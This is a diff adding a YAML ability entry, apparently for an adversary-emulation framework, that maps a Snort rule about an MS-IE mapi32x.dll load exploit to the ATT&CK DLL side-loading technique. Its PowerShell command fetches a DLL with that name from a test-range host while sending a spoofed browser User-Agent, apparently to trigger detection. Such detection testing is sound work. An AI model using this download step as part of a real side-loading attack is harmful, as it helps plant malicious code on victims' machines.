@@ -1,0 +1,35 @@
+- tactic: persistence
+  technique_name: 'Hijack Execution Flow: DLL Side-Loading'
+  technique_id: T1574.002
+  name: 'Intrusion: MS-IE mapi32x.dll DLL load exploit attempt'
+  description: 'Adversaries may exploit SID 1:37257 by abusing DLL search order hijacking
+    to execute malicious code. This relates to T1574.002 (Hijack Execution Flow: DLL
+    Search Order Hijacking), where attackers place malicious DLLs in locations searched
+    by applications, enabling execution in the context of trusted processes.'
+  executors:
+  - name: psh
+    platform: windows
+    command: 'Invoke-WebRequest -Uri "http://198.18.128.193/mapi32x.dll" ` -Method
+      Get ` -Headers @{ "User-Agent" = "Mozilla/5.0 (Windows NT 10.0; Win64; x64)
+      AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36" } '
+    code: null
+    language: null
+    build_target: null
+    payloads: []
+    uploads: []
+    timeout: 15
+    parsers: []
+    cleanup: []
+    variations: []
+    additional_info: {}
+  requirements: []
+  privilege: ''
+  repeatable: false
+  buckets: []
+  additional_info:
+    cleanup: '[]'
+  access: {}
+  singleton: true
+  plugin: ''
+  delete_payload: true
+  id: a2748af8-336c-490d-8551-5bcf6a6de55c
